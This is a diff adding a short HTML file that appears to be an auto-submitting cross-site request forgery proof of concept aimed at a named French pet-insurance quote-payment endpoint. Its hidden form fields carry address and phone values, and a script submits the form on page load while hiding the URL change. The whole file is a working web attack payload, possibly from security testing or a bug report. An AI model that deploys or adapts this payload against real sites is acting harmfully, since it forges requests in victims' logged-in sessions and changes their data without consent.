@@ -1,0 +1,20 @@
+<html>
+  <body>
+    <form action="https://assurance-animaux.selfassurance.fr/devis/paiement" method="POST">
+      <input type="hidden" name="couleurs&#95;poils" value="Autre" />
+      <input type="hidden" name="tutelleOuCuratelle" value="NON" />
+      <input type="hidden" name="numero" value="12" />
+      <input type="hidden" name="type&#95;voie" value="RUE" />
+      <input type="hidden" name="nom&#95;voie" value="14000" />
+      <input type="hidden" name="ville" value="Caen" />
+      <input type="hidden" name="cp" value="14000" />
+      <input type="hidden" name="mobile" value="0612345678" />
+      <input type="hidden" name="num&#95;identification" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
